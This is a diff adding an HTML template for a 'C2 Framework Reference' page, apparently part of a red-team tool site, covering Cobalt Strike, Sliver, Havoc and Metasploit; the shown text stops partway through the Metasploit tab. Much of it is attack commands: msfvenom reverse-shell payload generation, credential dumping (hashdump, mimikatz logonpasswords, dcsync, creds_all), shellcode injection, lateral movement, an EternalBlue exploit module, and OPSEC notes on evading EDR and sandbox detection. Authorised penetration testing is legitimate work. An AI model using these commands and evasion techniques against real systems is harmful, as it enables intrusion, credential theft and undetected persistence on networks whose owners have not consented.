@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>C2 Framework Reference — Multiblade</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Syne:wght@700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#080a12;--s1:#0d0f1c;--s2:#121525;--s3:#191d31;
+      --border:#1e2240;--border-hi:#2d3260;
+      --text:#dde1f5;--text-dim:#6b7099;--text-faint:#373b5c;
+      --accent:#6366f1;--accent-hi:#818cf8;--accent-glow:#6366f133;
+      --amber:#f59e0b;--amber-glow:#f59e0b18;--amber-border:#f59e0b35;
+      --green:#22d3ee;
+      --radius:12px;
+    }
+    body { background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;font-size:14px;line-height:1.6; }
+
+    .bg-layer{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;}
+    .blob{position:absolute;border-radius:50%;filter:blur(100px);}
+    .blob-1{width:700px;height:700px;background:radial-gradient(circle,#3730a314,transparent 70%);top:-250px;left:-100px;}
+    .blob-2{width:500px;height:500px;background:radial-gradient(circle,#7c3aed10,transparent 70%);bottom:-150px;right:-80px;}
+    .blob-3{width:400px;height:400px;background:radial-gradient(circle,#6366f10a,transparent 70%);top:40%;left:40%;}
+    .grid-ov{position:fixed;inset:0;z-index:0;pointer-events:none;background-image:radial-gradient(circle,#6366f112 1px,transparent 1px);background-size:32px 32px;mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 40%,transparent 100%);}
+
+    .main{position:relative;z-index:1;padding:0 0 120px;margin-left:60px;}
+
+    /* Page header */
+    .page-header{
+      position:sticky;top:0;z-index:50;
+      background:linear-gradient(180deg,var(--bg) 75%,transparent);
+      padding:24px 40px 18px;
+    }
+    .header-top{display:flex;align-items:center;gap:14px;margin-bottom:4px;}
+    .back-link{
+      display:inline-flex;align-items:center;gap:5px;
+      text-decoration:none;color:var(--text-faint);font-size:0.76rem;
+      transition:color 0.15s;flex-shrink:0;
+    }
+    .back-link:hover{color:var(--text-dim);}
+    .back-link svg{width:12px;height:12px;flex-shrink:0;}
+    .page-title{font-family:'Syne',sans-serif;font-size:1.45rem;font-weight:800;letter-spacing:0.04em;line-height:1.1;}
+    .page-subtitle{font-size:0.8rem;color:var(--text-dim);margin-top:4px;max-width:620px;}
+
+    /* Framework tabs */
+    .fw-tabs{
+      display:flex;gap:8px;flex-wrap:wrap;
+      padding:20px 40px 0;
+    }
+    .fw-tab{
+      display:inline-flex;align-items:center;gap:9px;
+      padding:9px 20px;border-radius:99px;
+      border:1.5px solid var(--border);background:var(--s1);
+      color:var(--text-dim);font-size:0.82rem;font-weight:600;font-family:'Inter',sans-serif;
+      cursor:pointer;transition:all 0.18s;user-select:none;
+      letter-spacing:0.02em;
+    }
+    .fw-tab:hover{border-color:var(--border-hi);color:var(--text);background:var(--s2);}
+    .fw-tab.active{
+      border-color:var(--accent);color:var(--accent-hi);
+      background:var(--accent-glow);
+      box-shadow:0 0 0 1px var(--accent-glow);
+    }
+    .fw-dot{
+      width:9px;height:9px;border-radius:50%;flex-shrink:0;
+    }
+
+    /* Framework panels */
+    .fw-panel{display:none;padding:28px 40px 0;}
+    .fw-panel.active{display:block;}
+
+    /* Section */
+    .section{margin-bottom:32px;}
+    .section-title{
+      font-family:'Syne',sans-serif;font-size:0.88rem;font-weight:800;
+      letter-spacing:0.1em;text-transform:uppercase;
+      color:var(--text-dim);margin-bottom:14px;
+      display:flex;align-items:center;gap:8px;
+    }
+    .section-title::after{
+      content:'';flex:1;height:1px;background:var(--border);
+    }
+
+    /* Command grid: two columns on wide screens */
+    .cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+    @media(max-width:900px){.cmd-grid{grid-template-columns:1fr;}}
+
+    /* Code block */
+    .cmd-block{
+      position:relative;
+      background:var(--s1);border:1.5px solid var(--border);border-radius:var(--radius);
+      overflow:hidden;
+    }
+    .cmd-block-header{
+      display:flex;align-items:center;justify-content:space-between;
+      padding:8px 14px;border-bottom:1px solid var(--border);
+      background:var(--s2);
+    }
+    .cmd-block-label{font-size:0.68rem;color:var(--text-faint);font-family:'Fira Code',monospace;letter-spacing:0.04em;text-transform:uppercase;}
+    .copy-btn{
+      background:none;border:1px solid var(--border);border-radius:6px;
+      padding:3px 9px;font-size:0.7rem;color:var(--text-faint);
+      cursor:pointer;font-family:'Inter',sans-serif;
+      transition:all 0.15s;
+    }
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent-hi);}
+    .copy-btn.copied{border-color:#22d3ee50;color:#22d3ee;background:#22d3ee0a;}
+    pre{
+      padding:14px 16px;overflow-x:auto;
+      font-family:'Fira Code',monospace;font-size:0.8rem;line-height:1.7;
+      color:var(--text);
+    }
+    pre .c{color:var(--text-faint);font-style:italic;}          /* comments */
+    pre .cmd{color:var(--accent-hi);}                            /* commands / keys */
+    pre .str{color:#a5f3fc;}                                     /* string values */
+    pre .kw{color:#c4b5fd;}                                      /* keywords */
+    pre .flag{color:#86efac;}                                    /* flags/options */
+    pre .num{color:#fda4af;}                                     /* numbers */
+
+    /* Command table */
+    .cmd-table{
+      width:100%;border-collapse:collapse;
+      font-size:0.8rem;
+    }
+    .cmd-table tr{border-bottom:1px solid var(--border);}
+    .cmd-table tr:last-child{border-bottom:none;}
+    .cmd-table tr:hover td{background:var(--s2);}
+    .cmd-table td{padding:8px 14px;vertical-align:top;}
+    .cmd-table td:first-child{
+      font-family:'Fira Code',monospace;font-size:0.77rem;
+      color:var(--accent-hi);white-space:nowrap;width:1%;
+      padding-right:20px;
+    }
+    .cmd-table td:last-child{color:var(--text-dim);}
+
+    /* Listener / type pills */
+    .listener-list{display:flex;flex-wrap:wrap;gap:8px;}
+    .listener-pill{
+      display:flex;flex-direction:column;
+      background:var(--s2);border:1.5px solid var(--border);border-radius:10px;
+      padding:10px 14px;min-width:140px;flex:1;
+    }
+    .listener-name{font-family:'Fira Code',monospace;font-size:0.78rem;color:var(--accent-hi);font-weight:500;}
+    .listener-desc{font-size:0.72rem;color:var(--text-dim);margin-top:2px;}
+
+    /* OPSEC card */
+    .opsec-card{
+      background:var(--amber-glow);border:1.5px solid var(--amber-border);
+      border-radius:var(--radius);padding:16px 20px;
+    }
+    .opsec-header{
+      display:flex;align-items:center;gap:8px;
+      font-family:'Syne',sans-serif;font-size:0.82rem;font-weight:800;
+      letter-spacing:0.08em;text-transform:uppercase;
+      color:var(--amber);margin-bottom:12px;
+    }
+    .opsec-icon{font-size:1rem;flex-shrink:0;}
+    .opsec-list{list-style:none;display:flex;flex-direction:column;gap:7px;}
+    .opsec-item{
+      display:flex;align-items:baseline;gap:8px;
+      font-size:0.8rem;color:var(--text-dim);line-height:1.5;
+    }
+    .opsec-item::before{
+      content:'▸';color:var(--amber);flex-shrink:0;font-size:0.7rem;
+    }
+    .opsec-item code{
+      font-family:'Fira Code',monospace;font-size:0.75rem;
+      color:var(--accent-hi);
+      background:var(--s2);padding:1px 5px;border-radius:4px;
+    }
+
+    /* Wide code block (full width) */
+    .cmd-block-full{margin-bottom:16px;}
+    .cmd-block-full:last-child{margin-bottom:0;}
+
+    /* Responsive */
+    @media(max-width:700px){
+      .fw-tabs{padding:16px 16px 0;}
+      .fw-panel{padding:20px 16px 0;}
+      .page-header{padding:16px 16px 12px;}
+    }
+  </style>
+</head>
+<body>
+<div class="bg-layer">
+  <div class="blob blob-1"></div>
+  <div class="blob blob-2"></div>
+  <div class="blob blob-3"></div>
+  <div class="grid-ov"></div>
+</div>
+
+{% set active_page = "ref-c2" %}
+{% include '_nav.html' %}
+
+<div class="main">
+
+  <div class="page-header">
+    <div class="header-top">
+      <a href="/generators" class="back-link">
+        <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M8 2L4 6l4 4"/></svg>
+        Generators
+      </a>
+    </div>
+    <div class="page-title">C2 Framework Reference</div>
+    <div class="page-subtitle">Quick-reference for Cobalt Strike, Sliver, Havoc, and Metasploit — setup, profiles, and OPSEC notes</div>
+  </div>
+
+  <!-- Framework tab buttons -->
+  <div class="fw-tabs" role="tablist">
+    <button class="fw-tab active" role="tab" aria-selected="true"  onclick="switchTab('cs')"  id="tab-cs">
+      <span class="fw-dot" style="background:#ef4444;box-shadow:0 0 6px #ef444480;"></span>
+      Cobalt Strike
+    </button>
+    <button class="fw-tab" role="tab" aria-selected="false" onclick="switchTab('sliver')" id="tab-sliver">
+      <span class="fw-dot" style="background:#22d3ee;box-shadow:0 0 6px #22d3ee80;"></span>
+      Sliver
+    </button>
+    <button class="fw-tab" role="tab" aria-selected="false" onclick="switchTab('havoc')"  id="tab-havoc">
+      <span class="fw-dot" style="background:#a855f7;box-shadow:0 0 6px #a855f780;"></span>
+      Havoc
+    </button>
+    <button class="fw-tab" role="tab" aria-selected="false" onclick="switchTab('msf')"   id="tab-msf">
+      <span class="fw-dot" style="background:#f59e0b;box-shadow:0 0 6px #f59e0b80;"></span>
+      Metasploit
+    </button>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════
+       TAB 1: Cobalt Strike
+  ════════════════════════════════════════════════════ -->
+  <div class="fw-panel active" id="panel-cs" role="tabpanel">
+
+    <div class="section">
+      <div class="section-title">Setup &amp; Teamserver</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">bash</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="c"># Start teamserver</span>
+<span class="cmd">./teamserver</span> <span class="str">&lt;IP&gt;</span> <span class="str">&lt;password&gt;</span> <span class="flag">[malleable_profile]</span>
+
+<span class="c"># Connect client</span>
+<span class="cmd">java</span> <span class="flag">-jar</span> cobaltstrike.jar</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Listener Types</div>
+      <div class="listener-list">
+        <div class="listener-pill">
+          <span class="listener-name">HTTP / HTTPS</span>
+          <span class="listener-desc">Standard beacon listener; blends with web traffic</span>
+        </div>
+        <div class="listener-pill">
+          <span class="listener-name">DNS</span>
+          <span class="listener-desc">DNS-based C2 — very stealthy, slow throughput</span>
+        </div>
+        <div class="listener-pill">
+          <span class="listener-name">SMB</span>
+          <span class="listener-desc">Peer-to-peer over named pipes; no direct egress</span>
+        </div>
+        <div class="listener-pill">
+          <span class="listener-name">TCP</span>
+          <span class="listener-desc">Direct TCP bind or reverse; fast, noisy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Beacon Commands</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">beacon shell</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <table class="cmd-table">
+          <tbody>
+            <tr><td>sleep &lt;sec&gt; [jitter%]</td><td>Set callback interval and jitter percentage</td></tr>
+            <tr><td>ps</td><td>List running processes</td></tr>
+            <tr><td>getpid</td><td>Display current beacon PID</td></tr>
+            <tr><td>inject &lt;pid&gt; &lt;arch&gt;</td><td>Inject beacon shellcode into a process</td></tr>
+            <tr><td>spawn &lt;arch&gt;</td><td>Spawn a new beacon process</td></tr>
+            <tr><td>shinject &lt;pid&gt; &lt;arch&gt; &lt;file.bin&gt;</td><td>Inject arbitrary shellcode into a process</td></tr>
+            <tr><td>execute-assembly &lt;asm.exe&gt; [args]</td><td>Run .NET assembly in-memory via fork&amp;run</td></tr>
+            <tr><td>powershell &lt;cmd&gt;</td><td>Run PowerShell through powershell.exe</td></tr>
+            <tr><td>powerpick &lt;cmd&gt;</td><td>Run PowerShell without spawning powershell.exe</td></tr>
+            <tr><td>upload &lt;file&gt;</td><td>Upload file to target</td></tr>
+            <tr><td>download &lt;file&gt;</td><td>Download file from target</td></tr>
+            <tr><td>getsystem</td><td>Attempt privilege escalation to SYSTEM</td></tr>
+            <tr><td>hashdump</td><td>Dump local SAM hashes</td></tr>
+            <tr><td>logonpasswords</td><td>Invoke mimikatz logonpasswords</td></tr>
+            <tr><td>dcsync &lt;domain&gt; [user]</td><td>DCSync attack via mimikatz</td></tr>
+            <tr><td>portscan &lt;targets&gt; &lt;ports&gt;</td><td>Internal port scan</td></tr>
+            <tr><td>jump psexec &lt;target&gt; &lt;listener&gt;</td><td>Lateral movement via PsExec service</td></tr>
+            <tr><td>jump winrm &lt;target&gt; &lt;listener&gt;</td><td>Lateral movement via WinRM</td></tr>
+            <tr><td>remote-exec wmi &lt;target&gt; &lt;cmd&gt;</td><td>Execute command via WMI</td></tr>
+            <tr><td>link &lt;target&gt;</td><td>Connect to an SMB beacon (named pipe)</td></tr>
+            <tr><td>exit</td><td>Terminate the beacon</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Malleable C2 Profile — Key Settings</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">malleable c2</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="kw">set</span> sleeptime  <span class="str">"60000"</span>;  <span class="c"># 60 s callback interval</span>
+<span class="kw">set</span> jitter     <span class="str">"20"</span>;     <span class="c"># 20 % jitter</span>
+<span class="kw">set</span> useragent  <span class="str">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span>;
+<span class="kw">set</span> dns_max_txt <span class="str">"252"</span>;
+
+<span class="kw">http-get</span> {
+  <span class="kw">set</span> uri <span class="str">"/api/v1/health"</span>;
+  <span class="kw">client</span> {
+    <span class="kw">header</span> <span class="str">"Accept"</span> <span class="str">"application/json"</span>;
+  }
+}</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">OPSEC Notes</div>
+      <div class="opsec-card">
+        <div class="opsec-header"><span class="opsec-icon">⚠</span> Operational Security</div>
+        <ul class="opsec-list">
+          <li class="opsec-item">Use <code>powerpick</code> over <code>powershell</code> — avoids spawning powershell.exe, reducing EDR telemetry</li>
+          <li class="opsec-item">Set sleep &gt;60 s with jitter (e.g. <code>sleep 120 20</code>) to break timing-based beacon detection</li>
+          <li class="opsec-item">Use <code>execute-assembly</code> for .NET tooling — runs entirely in-memory, nothing written to disk</li>
+          <li class="opsec-item">Avoid <code>getsystem</code> on EDR-monitored endpoints; token impersonation is heavily flagged</li>
+          <li class="opsec-item">Prefer DNS or DoH listener for egress in networks with restrictive HTTP inspection</li>
+          <li class="opsec-item">Rename default artifacts — <code>artifact.exe</code> and default pipe names are widely signatured</li>
+          <li class="opsec-item">Customize the malleable profile UA, URIs, and headers to match a plausible application</li>
+        </ul>
+      </div>
+    </div>
+
+  </div><!-- /panel-cs -->
+
+  <!-- ═══════════════════════════════════════════════════
+       TAB 2: Sliver
+  ════════════════════════════════════════════════════ -->
+  <div class="fw-panel" id="panel-sliver" role="tabpanel">
+
+    <div class="section">
+      <div class="section-title">Server Setup</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">bash</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="c"># Install</span>
+<span class="cmd">curl</span> https://sliver.sh/install <span class="flag">| sudo bash</span>
+
+<span class="c"># Start server</span>
+<span class="cmd">sliver-server</span>
+
+<span class="c"># Multiplayer: create operator config</span>
+<span class="cmd">sliver-server operator</span> <span class="flag">--name</span> operator1 <span class="flag">--lhost</span> <span class="str">&lt;IP&gt;</span> <span class="flag">--save</span> operator1.cfg
+
+<span class="c"># Import config and connect</span>
+<span class="cmd">sliver-client import</span> operator1.cfg</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Generate Implants</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">sliver console</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="c"># HTTPS beacon (Windows x64)</span>
+<span class="cmd">generate beacon</span> <span class="flag">--http</span> https://<span class="str">&lt;IP&gt;</span>:443 <span class="flag">--os</span> windows <span class="flag">--arch</span> amd64 <span class="flag">--name</span> IMPLANT
+
+<span class="c"># mTLS session (Linux)</span>
+<span class="cmd">generate</span> <span class="flag">--mtls</span> <span class="str">&lt;IP&gt;</span>:8888 <span class="flag">--os</span> linux <span class="flag">--arch</span> amd64 <span class="flag">--format</span> elf
+
+<span class="c"># DNS beacon</span>
+<span class="cmd">generate beacon</span> <span class="flag">--dns</span> <span class="str">&lt;domain&gt;</span> <span class="flag">--name</span> DNS_IMPLANT
+
+<span class="c"># Shellcode (position-independent)</span>
+<span class="cmd">generate</span> <span class="flag">--http</span> https://<span class="str">&lt;IP&gt;</span> <span class="flag">--format</span> shellcode</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Listeners</div>
+      <div class="listener-list">
+        <div class="listener-pill">
+          <span class="listener-name">https</span>
+          <span class="listener-desc">HTTPS listener — default for most engagements</span>
+        </div>
+        <div class="listener-pill">
+          <span class="listener-name">mtls</span>
+          <span class="listener-desc">Mutual TLS — strong authentication, both sides cert-pinned</span>
+        </div>
+        <div class="listener-pill">
+          <span class="listener-name">dns</span>
+          <span class="listener-desc">DNS beacon — stealthy, ~1 req/10 s, low bandwidth</span>
+        </div>
+        <div class="listener-pill">
+          <span class="listener-name">wg</span>
+          <span class="listener-desc">WireGuard tunnel — encrypted, fast, uncommon egress</span>
+        </div>
+        <div class="listener-pill">
+          <span class="listener-name">http</span>
+          <span class="listener-desc">Plaintext HTTP — avoid in production engagements</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Key Commands</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">sliver console</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <table class="cmd-table">
+          <tbody>
+            <tr><td>beacons</td><td>List active beacons</td></tr>
+            <tr><td>sessions</td><td>List active interactive sessions</td></tr>
+            <tr><td>use &lt;id&gt;</td><td>Interact with a beacon or session</td></tr>
+            <tr><td>info</td><td>Display target host information</td></tr>
+            <tr><td>ps</td><td>List running processes</td></tr>
+            <tr><td>screenshot</td><td>Capture desktop screenshot</td></tr>
+            <tr><td>upload / download</td><td>Transfer files to/from target</td></tr>
+            <tr><td>execute &lt;cmd&gt;</td><td>Run a command and return output</td></tr>
+            <tr><td>shell</td><td>Drop to interactive OS shell</td></tr>
+            <tr><td>execute-assembly --in-process &lt;asm&gt;</td><td>Run .NET assembly in-memory (no fork)</td></tr>
+            <tr><td>sideload &lt;dll&gt; &lt;export&gt;</td><td>Sideload and call a DLL export</td></tr>
+            <tr><td>spawndll &lt;dll&gt;</td><td>Spawn a shellcode runner from a DLL</td></tr>
+            <tr><td>portfwd add --bind &lt;port&gt; --remote &lt;host:port&gt;</td><td>Forward a local port to a remote host</td></tr>
+            <tr><td>pivots tcp --bind &lt;port&gt;</td><td>Create a TCP pivot listener on target</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">OPSEC Notes</div>
+      <div class="opsec-card">
+        <div class="opsec-header"><span class="opsec-icon">⚠</span> Operational Security</div>
+        <ul class="opsec-list">
+          <li class="opsec-item">Sliver is open-source — AV/EDR signatures exist for default builds; use <code>--obfuscate</code> flag or custom compilation</li>
+          <li class="opsec-item">mTLS provides the strongest implant-server authentication; prefer it over HTTPS when possible</li>
+          <li class="opsec-item">DNS beacons are stealthiest but slow (~1 request per 10 s); avoid for interactive operations</li>
+          <li class="opsec-item">Use <code>--canary &lt;domain&gt;</code> to detect if the implant is running inside a sandbox</li>
+          <li class="opsec-item">Use <code>execute-assembly --in-process</code> to avoid the fork-and-run pattern that EDRs monitor</li>
+          <li class="opsec-item">Install Armory extensions for BOF (Beacon Object File) support: <code>armory install all</code></li>
+          <li class="opsec-item">Limit concurrent sessions per operator to reduce C2 traffic patterns</li>
+        </ul>
+      </div>
+    </div>
+
+  </div><!-- /panel-sliver -->
+
+  <!-- ═══════════════════════════════════════════════════
+       TAB 3: Havoc
+  ════════════════════════════════════════════════════ -->
+  <div class="fw-panel" id="panel-havoc" role="tabpanel">
+
+    <div class="section">
+      <div class="section-title">Setup</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">bash</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="cmd">git clone</span> https://github.com/HavocFramework/Havoc
+<span class="cmd">cd</span> Havoc <span class="flag">&amp;&amp;</span> <span class="cmd">make</span> ts-build
+
+<span class="c"># Start teamserver with profile</span>
+<span class="cmd">./havoc server</span> <span class="flag">--profile</span> profiles/havoc.yaotl
+
+<span class="c"># Connect client UI</span>
+<span class="cmd">./havoc client</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Profile — havoc.yaotl Key Settings</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">toml / yaotl</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="kw">Teamserver</span> {
+    Host = <span class="str">"0.0.0.0"</span>
+    Port = <span class="num">40056</span>
+}
+
+<span class="kw">Listeners</span> {
+    <span class="kw">Http</span> {
+        Name     = <span class="str">"http-listener"</span>
+        Hosts    = [<span class="str">"&lt;IP&gt;"</span>]
+        HostBind = <span class="str">"0.0.0.0"</span>
+        Port     = <span class="num">443</span>
+        Secure   = <span class="kw">true</span>
+        UserAgent = <span class="str">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span>
+        Uris     = [<span class="str">"/updates"</span>, <span class="str">"/api/health"</span>, <span class="str">"/cdn/js/app.js"</span>]
+    }
+}
+
+<span class="kw">Demon</span> {
+    Sleep  = <span class="num">5</span>
+    Jitter = <span class="num">20</span>
+    <span class="kw">Injection</span> {
+        Spawn64 = <span class="str">"C:\\Windows\\System32\\notepad.exe"</span>
+        Spawn32 = <span class="str">"C:\\Windows\\SysWOW64\\notepad.exe"</span>
+    }
+}</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Demon Implant Commands</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">demon shell</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <table class="cmd-table">
+          <tbody>
+            <tr><td>sleep &lt;sec&gt; [jitter]</td><td>Set callback interval and optional jitter %</td></tr>
+            <tr><td>ps</td><td>List running processes</td></tr>
+            <tr><td>token steal &lt;pid&gt;</td><td>Impersonate token from target process</td></tr>
+            <tr><td>dotnet inline-execute &lt;asm&gt; [args]</td><td>Run .NET assembly in-memory without fork</td></tr>
+            <tr><td>shellcode inject &lt;pid&gt; &lt;file&gt;</td><td>Inject shellcode into a process</td></tr>
+            <tr><td>powershell &lt;cmd&gt;</td><td>Execute a PowerShell command</td></tr>
+            <tr><td>upload / download</td><td>Transfer files to/from target</td></tr>
+            <tr><td>pivot create smb</td><td>Create an SMB named-pipe pivot</td></tr>
+            <tr><td>pivot list</td><td>List active pivots</td></tr>
+            <tr><td>socks &lt;port&gt;</td><td>Start a SOCKS5 proxy on the specified port</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">OPSEC Notes</div>
+      <div class="opsec-card">
+        <div class="opsec-header"><span class="opsec-icon">⚠</span> Operational Security</div>
+        <ul class="opsec-list">
+          <li class="opsec-item">Havoc is newer than Cobalt Strike — fewer AV/EDR signatures in the wild, but growing</li>
+          <li class="opsec-item">Change <code>Spawn64</code>/<code>Spawn32</code> from <code>notepad.exe</code> — default spawn processes are monitored by EDRs</li>
+          <li class="opsec-item">Always use HTTPS (<code>Secure = true</code>) with a valid or self-signed cert; plain HTTP is trivially detected</li>
+          <li class="opsec-item"><code>dotnet inline-execute</code> loads .NET in-process — avoids disk writes and fork-and-run detection patterns</li>
+          <li class="opsec-item">Set jitter &gt;20 % to randomize callback timing and defeat statistical beacon detection</li>
+          <li class="opsec-item">Customize listener URIs and User-Agent to match a real-looking web application</li>
+          <li class="opsec-item">Havoc is open-source — compile with modified build flags to reduce static signatures</li>
+        </ul>
+      </div>
+    </div>
+
+  </div><!-- /panel-havoc -->
+
+  <!-- ═══════════════════════════════════════════════════
+       TAB 4: Metasploit
+  ════════════════════════════════════════════════════ -->
+  <div class="fw-panel" id="panel-msf" role="tabpanel">
+
+    <div class="section">
+      <div class="section-title">Start &amp; Basic Setup</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">bash / msfconsole</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="cmd">msfconsole</span>
+<span class="cmd">msfdb init</span>                              <span class="c"># init PostgreSQL workspace</span>
+<span class="cmd">db_status</span>                               <span class="c"># verify DB connection</span>
+<span class="cmd">workspace</span> <span class="flag">-a</span> pentest-corp              <span class="c"># create named workspace</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Handler Setup</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">msfconsole</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="cmd">use</span> exploit/multi/handler
+<span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_https
+<span class="cmd">set</span> LHOST <span class="str">&lt;IP&gt;</span>
+<span class="cmd">set</span> LPORT <span class="num">443</span>
+<span class="cmd">set</span> ExitOnSession <span class="kw">false</span>
+<span class="cmd">run</span> <span class="flag">-j</span>                                 <span class="c"># run as background job</span></pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Generate Payloads (msfvenom)</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">bash</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="c"># Windows EXE</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_https \
+  LHOST=<span class="str">&lt;IP&gt;</span> LPORT=<span class="num">443</span> <span class="flag">-f</span> exe <span class="flag">-o</span> payload.exe
+
+<span class="c"># PowerShell script</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_https \
+  LHOST=<span class="str">&lt;IP&gt;</span> LPORT=<span class="num">443</span> <span class="flag">-f</span> psh <span class="flag">-o</span> payload.ps1
+
+<span class="c"># Linux ELF</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> linux/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="str">&lt;IP&gt;</span> LPORT=<span class="num">4444</span> <span class="flag">-f</span> elf <span class="flag">-o</span> payload
+
+<span class="c"># DLL</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_https \
+  LHOST=<span class="str">&lt;IP&gt;</span> LPORT=<span class="num">443</span> <span class="flag">-f</span> dll <span class="flag">-o</span> payload.dll</pre>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Meterpreter Key Commands</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">meterpreter</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <table class="cmd-table">
+          <tbody>
+            <tr><td>sysinfo</td><td>Display OS and hostname information</td></tr>
+            <tr><td>getuid</td><td>Show current user context</td></tr>
+            <tr><td>getpid</td><td>Display current meterpreter PID</td></tr>
+            <tr><td>ps</td><td>List running processes</td></tr>
+            <tr><td>migrate &lt;pid&gt;</td><td>Migrate into another process</td></tr>
+            <tr><td>getsystem</td><td>Attempt privilege escalation to SYSTEM</td></tr>
+            <tr><td>hashdump</td><td>Dump local SAM hashes (requires SYSTEM)</td></tr>
+            <tr><td>load kiwi</td><td>Load mimikatz-based kiwi extension</td></tr>
+            <tr><td>creds_all</td><td>Dump all credentials via kiwi</td></tr>
+            <tr><td>upload / download</td><td>Transfer files to/from target</td></tr>
+            <tr><td>shell</td><td>Drop to interactive OS shell</td></tr>
+            <tr><td>background</td><td>Background current session</td></tr>
+            <tr><td>portfwd add -l &lt;lp&gt; -r &lt;rh&gt; -p &lt;rp&gt;</td><td>Forward local port to remote host:port</td></tr>
+            <tr><td>run post/multi/recon/local_exploit_suggester</td><td>Identify local privilege escalation vectors</td></tr>
+            <tr><td>run post/windows/gather/credentials/credential_collector</td><td>Harvest stored credentials</td></tr>
+            <tr><td>run post/windows/manage/enable_rdp</td><td>Enable RDP and open firewall rule</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Useful Modules</div>
+      <div class="cmd-block">
+        <div class="cmd-block-header">
+          <span class="cmd-block-label">msfconsole</span>
+          <button class="copy-btn" onclick="copyBlock(this)">Copy</button>
+        </div>
+        <pre><span class="cmd">use</span> auxiliary/scanner/smb/smb_ms17_010          <span class="c"># EternalBlue check</span>
+<span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue    <span class="c"># EternalBlue exploit</span>
+<span class="cmd">use</span> auxiliary/scanner/portscan/tcp              <span class="c"># TCP port scanner</span>
+<span class="cmd">use</span> post/multi/manage/shell_to_meterpreter      <span class="c"># Upgrade shell session</span></pre>
+      </div>
+    </div>
+
